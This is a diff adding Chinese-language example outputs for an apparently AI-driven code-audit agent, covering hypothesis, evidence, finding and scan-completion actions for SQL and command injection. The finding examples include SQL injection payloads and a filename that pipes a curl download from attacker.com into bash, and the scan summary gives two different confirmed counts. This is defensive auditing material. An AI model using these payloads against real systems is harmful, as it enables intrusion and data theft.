@@ -1,0 +1,137 @@
+## Phase 2 Action 输出示例
+
+---
+
+## submit_hypothesis 示例
+
+发现 grep 命中后立即提交假设，不要等到验证完再提交。
+
+```json
+{
+  "@action": "submit_hypothesis",
+  "human_readable_thought": "grep 'mysqli_query' 在 includes/admin.inc.php:557 命中，代码行显示字符串拼接 '... WHERE logins <= '. $logins，$logins 可能来自 POST 参数，需要验证来源。",
+  "title": "admin.inc.php:557 mysqli_query 字符串拼接—$logins 来源待确认",
+  "sink_hint": "includes/admin.inc.php:557",
+  "source_hint": "疑似 POST 参数，待验证",
+  "unknowns": ["$logins 是否来自用户输入", "是否有 intval 或其他过滤"],
+  "priority": 3
+}
+```
+
+---
+
+## add_evidence 示例
+
+```json
+{
+  "@action": "add_evidence",
+  "human_readable_thought": "read_file 发现 admin.inc.php:554 有 $logins = $_POST['logins']，无过滤，直接到达 mysqli_query。",
+  "hypothesis_id": "H-001",
+  "evidence": "admin.inc.php:554: $logins = $_POST['logins']（直接从 POST 参数赋值，无过滤），admin.inc.php:557: mysqli_query($connid, 'WHERE logins <= '.$logins)（字符串拼接）",
+  "remaining_unknowns": []
+}
+```
+
+---
+
+## resolve_hypothesis 示例（排除）
+
+```json
+{
+  "@action": "resolve_hypothesis",
+  "human_readable_thought": "read_file 发现 $logins = intval($_POST['logins'])，intval 强制整型，不存在 SQL 注入。",
+  "hypothesis_id": "H-002",
+  "status": "safe",
+  "reason": "$logins 经过 intval() 强制整型转换，只能是整数，无法注入 SQL 语法"
+}
+```
+
+---
+
+## add_finding 示例
+
+每发现一个已确认漏洞立即调用，调用后必须 resolve_hypothesis(confirmed)。
+
+### 示例 1 — SQL 注入（HIGH，PHP）
+
+```json
+{
+  "@action": "add_finding",
+  "human_readable_thought": "H-001 已验证：$logins = $_POST['logins'] 未过滤，直接拼接进 mysqli_query，可 SQL 注入。confidence=8。",
+  "module": "用户数据清理",
+  "file": "includes/admin.inc.php",
+  "line": 557,
+  "severity": "HIGH",
+  "title": "用户数据清理功能 SQL 注入",
+  "description": "admin.inc.php 中 clear_userdata 功能将 $_POST['logins'] 未经任何处理直接拼接进 mysqli_query 的 SQL 字符串，攻击者可注入任意 SQL 子句。",
+  "data_flow": "POST ?mode=admin&action=clear_userdata body.logins → admin.inc.php:554 $_POST['logins'] → admin.inc.php:557 mysqli_query($connid, '... WHERE logins <= '.$logins)",
+  "exploit_scenario": "POST logins=' OR 1=1-- 可绕过条件删除所有用户；logins=0 UNION SELECT user,password FROM users-- 可泄露账号密码。",
+  "recommendation": "改用参数化查询：$stmt = $connid->prepare('WHERE logins <= ? AND last_login < ...'); $stmt->bind_param('ii', $logins, $days); $stmt->execute();",
+  "confidence": 8
+}
+```
+
+### 示例 2 — 命令注入（HIGH，Go）
+
+```json
+{
+  "@action": "add_finding",
+  "human_readable_thought": "H-003 已验证：service/convert.go:67 exec.Command(\"bash\",\"-c\",cmd) 中 cmd 包含用户上传文件名，未过滤，可命令注入。",
+  "module": "文件转换",
+  "file": "service/convert.go",
+  "line": 67,
+  "severity": "HIGH",
+  "title": "文件转换服务命令注入",
+  "description": "ConvertService.Process() 将用户上传文件名 filename 未过滤直接拼接进 shell 命令，通过 exec.Command('bash','-c',cmd) 执行。",
+  "data_flow": "POST /api/file/convert multipart.filename → handler/file.go:38 c.PostForm('filename') → service/convert.go:15 Process(filename) → service/convert.go:67 exec.Command('bash','-c','convert '+filename)",
+  "exploit_scenario": "上传时设置 filename='a.jpg;curl http://attacker.com/shell.sh|bash' 可执行任意命令。",
+  "recommendation": "使用参数数组：exec.Command('convert', inputFile, outputFile)，并对 filename 做白名单校验。",
+  "confidence": 9
+}
+```
+
+---
+
+## mark_checklist 示例
+
+```json
+{
+  "@action": "mark_checklist",
+  "human_readable_thought": "已搜索完所有 SQL Sink 关键词组（PHP原生查询、PHP ORM Raw、Java JDBC/JPA、Python、Go、Node.js），标记 sinks_searched 完成。",
+  "item_id": "sinks_searched"
+}
+```
+
+---
+
+## complete_scan 示例
+
+```json
+{
+  "@action": "complete_scan",
+  "human_readable_thought": "所有 Sink 关键词已搜索，假设队列已清空（3个confirmed，2个safe，1个uncertain），覆盖清单 5/5 完成，触发 coverage_complete 停止。",
+  "stop_reason": "coverage_complete",
+  "coverage_summary": "已搜索 6 个 SinkGroup（PHP原生查询✓ PHP ORM Raw✓ Java✓ Python✓ Go✓ Node.js✓）和 Source 入口关键词。处理假设 6 条。清单完成 5/5。",
+  "findings_summary": "confirmed=1（admin.inc.php:557 SQL注入），safe=2（使用参数化查询），uncertain=1（配置来源无法追踪）"
+}
+```
+
+---
+
+## 典型工作流示例
+
+```
+1. grep("mysqli_query", group_name="PHP原生查询")  → 50 条命中
+2. submit_hypothesis(title="admin.inc.php:557 拼接", sink_hint="includes/admin.inc.php:557", priority=3)  → H-001
+3. grep("$_POST[", group_name=null)  → source 枚举，发现 includes/admin.inc.php:554 有 $_POST['logins']
+4. submit_hypothesis(title="admin.inc.php:554 POST输入流向557", priority=4)  → 更新 H-001 或创建 H-002
+5. mark_checklist("sources_enumerated")
+6. read_file("includes/admin.inc.php", 530, 570, hypothesis_id="H-001")
+7. add_evidence("H-001", "确认 $logins = $_POST['logins'] 无过滤直接到达 mysqli_query", remaining_unknowns=[])
+8. add_finding(...)   ← 提交确认的漏洞
+9. resolve_hypothesis("H-001", "confirmed", "数据流完整，无过滤")
+10. mark_checklist("dataflow_traced")
+11. mark_checklist("sinks_searched")  ← 搜完所有组
+12. mark_checklist("parameterized_checked")
+13. complete_scan(stop_reason="coverage_complete", ...)
+```
